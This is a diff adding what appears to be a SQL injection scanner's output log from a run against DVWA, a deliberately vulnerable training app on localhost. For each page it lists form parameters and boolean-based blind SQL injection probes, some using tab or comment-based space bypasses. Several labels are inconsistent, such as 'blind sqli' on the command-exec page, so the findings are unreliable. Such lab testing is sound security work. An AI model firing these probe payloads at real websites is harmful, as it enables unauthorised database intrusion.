@@ -1,0 +1,72 @@
+Target: http://localhost/dvwa/ (GET)
+
+---
+URL:http://localhost/dvwa/setup.php (POST)
+VulnName: 
+Query: {'user_token': '9883a093c5cde8397dac86c1fbf71df2', 'create_db': 'Create / Reset Database'}
+Payload: +and+58545=58545
++and+96196=96196
++or+7131=7131#
++and+29937=29938
+Advice: 
+Database: unknown
+---
+URL:http://localhost/dvwa/vulnerabilities/sqli/ (GET)
+VulnName: 
+Query: {'user_token': 'eb1d9a28d457bad5c9132f49ce167ea3', 'id': 'cntvalue', 'Submit': 'Submit'}
+Payload: '+and+'89179'='89179
+'+and+'63402'='63402
+'+or+90269=90269#
+'+and+'39198'='39199
+Advice: 
+Database: unknown
+---
+URL:http://localhost/dvwa/vulnerabilities/exec/ (POST)
+VulnName: blind sqli
+Query: {'ip': 'cntvalue', 'Submit': 'Submit', 'user_token': 'fbac4f57480284c94aa91a0e5a6cc5ff'}
+Payload: +and+58545=58545
++and+96196=96196
++or+7131=7131#
++and+29937=29938
+Advice: use orm
+Database: unknown
+---
+URL:http://localhost/dvwa/vulnerabilities/xss_r/ (GET)
+VulnName: 
+Query: {'user_token': '352c522b21bdc364604ce905c9b871c2', 'name': 'cntvalue'}
+Payload: 	and	75852=75852
+	and	79546=79546
+	or	26680=26680#
+	and	51338=51339
+Advice: 
+Database: unknown
+---
+URL:http://localhost/dvwa/vulnerabilities/csrf/ (GET)
+VulnName: 
+Query: {'password_new': 'cntvalue', 'password_current': 'cntvalue', 'password_conf': 'cntvalue', 'Change': 'Change', 'user_token': '68001fecfd500d5c3ec2a435b9195f99'}
+Payload: +and+58545=58545
++and+96196=96196
++or+7131=7131#
++and+29937=29938
+Advice: 
+Database: unknown
+---
+URL:http://localhost/dvwa/vulnerabilities/sqli_blind/ (GET)
+VulnName: blind sqli
+Query: {'user_token': 'c9f1272e5f36b734f550aaa383b5fe6d', 'id': 'cntvalue', 'Submit': 'Submit'}
+Payload: '	and	'5101'='5101
+'	and	'61374'='61374
+'	or	89025=89025#
+'	and	'18743'='18744
+Advice: use orm
+Database: unknown
+---
+URL:http://localhost/dvwa/vulnerabilities/brute/ (POST)
+VulnName: 
+Query: {'username': 'cntvalue', 'user_token': '626ed67b3e83ab17d4446f7dd7879e4b', 'Login': 'Login', 'password': 'cntvalue'}
+Payload: /**/and/**/25749=25749
+/**/and/**/2625=2625
+/**/or/**/28885=28885#
+/**/and/**/99041=99042
+Advice: 
+Database: unknown
